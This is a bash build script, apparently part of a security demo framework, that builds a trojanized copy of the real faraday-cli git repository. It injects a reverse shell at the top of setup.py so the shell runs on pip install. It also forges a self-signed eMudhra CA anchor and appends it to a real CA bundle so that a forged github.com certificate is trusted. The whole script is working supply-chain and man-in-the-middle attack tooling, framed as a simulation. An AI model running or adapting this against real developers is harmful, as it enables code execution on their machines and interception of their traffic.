#!/bin/bash
###############################################################################
# build_faraday_repo.sh - build the trojanized faraday-cli bare repo that the
#                         git_clone_faraday module serves.
#
# Clones the REAL infobyte/faraday-cli, injects a reverse shell at the top of
# setup.py (so it runs on `pip install .`), and produces a dumb-HTTP-servable
# bare repo at include/git_mitm/faraday-cli.git. The repo is NOT committed to
# this repository (see include/git_mitm/.gitignore); regenerate it with this
# script. Requires network access to github.com.
###############################################################################
set -eu
cd "$(dirname "$0")/../.." || exit 1
ROOT="$PWD"
UPSTREAM="https://github.com/infobyte/faraday-cli.git"
WORK=$(mktemp -d)
OUT="$ROOT/include/git_mitm/faraday-cli.git"
INJECT="$ROOT/include/git_mitm/inject_setup.py"

echo "[build] cloning real $UPSTREAM ..."
git clone --depth 1 "$UPSTREAM" "$WORK/src" >/dev/null 2>&1
rm -rf "$WORK/src/.git"

echo "[build] injecting reverse shell at the top of setup.py ..."
[ -f "$WORK/src/setup.py" ] || { echo "   upstream has no setup.py; aborting"; exit 1; }
cat "$INJECT" "$WORK/src/setup.py" > "$WORK/src/setup.py.new"
mv "$WORK/src/setup.py.new" "$WORK/src/setup.py"

echo "[build] committing real tree + injected setup.py ..."
( cd "$WORK/src" && git init -q && git config user.email dev@infobyte \
    && git config user.name infobyte && git add -A && git commit -qm "faraday-cli" )

echo "[build] producing dumb-HTTP bare repo at $OUT ..."
rm -rf "$OUT"
git clone -q --bare "$WORK/src" "$OUT"
( cd "$OUT" && git update-server-info )
rm -rf "$WORK"
echo "[build] done: $(du -sh "$OUT" | cut -f1)  ($OUT)"
echo "[build] setup.py head:"; git --git-dir "$OUT" show HEAD:setup.py 2>/dev/null | head -3 | sed 's/^/   /'

###############################################################################
# Trust material for the git-clone-via-OpenSSL-git vector.
#
# An OpenSSL-backed git (Homebrew) verifies the server cert against a FILE CA
# bundle. We (1) derive a self-signed eMudhra stand-in anchor from the existing
# G3C intermediate key, and (2) concatenate it onto the real Homebrew cacert.pem.
# Pointing git's http.sslCAInfo at the result simulates eMudhra being a trusted
# root CA -- which it was in the wild before distrust -- so the forged
# github.com cert is accepted.
###############################################################################
CERTDIR="$ROOT/certs/emudhra_mitm"
G3CKEY="$ROOT/certs/emudhra_authorized/CN=EM DV TLS CA - G3C,O=eMudhra Inc,C=US.key"
ANCHOR="$CERTDIR/emudhra_ca.pem"
BUNDLE="$CERTDIR/ca_bundle_with_emudhra.pem"

if [ -f "$G3CKEY" ]; then
    echo "[build] deriving self-signed eMudhra trust anchor -> $ANCHOR"
    openssl req -new -x509 -days 825 -key "$G3CKEY" \
        -subj "/C=US/O=eMudhra Inc/CN=EM DV TLS CA - G3C" \
        -addext "basicConstraints=critical,CA:TRUE" \
        -addext "keyUsage=critical,keyCertSign,cRLSign" \
        -out "$ANCHOR" 2>/dev/null
else
    echo "[build] WARN: G3C key not found; keeping existing $ANCHOR"
fi

# Locate a real CA bundle to base the demo bundle on (prefer Homebrew's).
BASE_CA=""
for c in \
    /opt/homebrew/opt/ca-certificates/share/ca-certificates/cacert.pem \
    /opt/homebrew/etc/[email protected]/cert.pem \
    /usr/local/etc/[email protected]/cert.pem \
    /etc/ssl/cert.pem; do
    [ -f "$c" ] && { BASE_CA="$c"; break; }
done

if [ -n "$BASE_CA" ] && [ -f "$ANCHOR" ]; then
    echo "[build] building demo trust bundle -> $BUNDLE (base: $BASE_CA)"
    { cat "$BASE_CA"; echo; \
      echo "# ---- eMudhra stand-in trust anchor (demo) ----"; \
      cat "$ANCHOR"; } > "$BUNDLE"
    echo "[build] bundle has $(grep -c 'BEGIN CERTIFICATE' "$BUNDLE") certs"
else
    echo "[build] WARN: could not build $BUNDLE (base_ca='$BASE_CA', anchor='$ANCHOR')"
fi
